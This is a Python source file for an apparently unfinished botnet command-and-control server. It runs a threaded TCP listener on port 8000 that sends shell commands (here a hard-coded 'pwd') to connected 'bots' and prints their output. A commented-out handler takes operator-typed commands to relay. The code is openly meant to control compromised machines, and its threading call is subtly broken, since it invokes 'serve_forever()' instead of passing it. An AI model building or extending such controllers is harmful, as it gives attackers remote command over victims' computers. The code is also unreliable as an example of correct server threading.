#import socket
import threading
import socketserver
'''
class BotHandler(socketserver.BaseRequestHandler):

        #Handles the behaviour of the client connection
        def handle(self):
                self.data = self.request.recv(1024).strip()
                print("Bot with IP {} sent:".format(self.client_address[0]))
                print(self.data)
                #If we don't have the while loop, the connection is "handled"
                # once, but then once the method ends it just hangs
                # So, the loop ensures we can keep sending commands, BUT it also
                # takes up the entire process. 
                # So, we basically need to multithread
                #TODO: This will not work if we want to select which bots to send commands to.
                while True:
                        #Now, let's figure out how to get it to send commands instead!
                        command =""
                        command = input("Please enter a command: ")
                        self.request.sendall(command.encode())
                        message = self.request.recv(1024).strip()
                        print(message)
'''

class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):

    def handle(self):
        data = str(self.request.recv(1024), 'ascii')
        cur_thread = threading.current_thread()
        response = bytes("{}: {}".format(cur_thread.name, data), 'ascii')
        self.request.sendall(response)
        while True:
                #Now, let's figure out how to get it to send commands instead!
                command ="pwd"
                self.request.sendall(command.encode())
                message = self.request.recv(1024).strip()
                response = bytes("{}: {}".format(cur_thread.name, message), 'ascii')
                print(response)

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass
if __name__ == "__main__":
    # Port 0 means to select an arbitrary unused port
    HOST, PORT = "", 8000

    server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
    with server:
        ip, port = server.server_address

        # Start a thread with the server -- that thread will then start one
        # more thread for each request
        server_thread = threading.Thread(target=server.serve_forever())
        # Exit the server thread when the main thread terminates
        server_thread.daemon = True
        server_thread.start()
        print("Server loop running in thread:", server_thread.name)

        #server.shutdown()
